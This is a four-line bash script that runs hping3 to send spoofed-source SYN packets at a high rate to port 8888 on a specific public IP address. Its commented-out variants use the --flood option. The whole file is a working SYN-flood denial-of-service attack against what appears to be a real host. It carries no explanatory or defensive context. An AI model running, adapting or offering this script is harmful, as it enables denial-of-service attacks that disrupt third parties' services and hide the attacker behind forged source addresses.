#!/bin/bash
#hping3 -q -n --rand-source -S -p 8888 -i u1000 8.138.103.150
hping3 --rand-source -S -p 8888 -i u1000 8.138.103.150
#hping3 -q -n --rand-source -S -p 8888 --flood 8.138.103.150
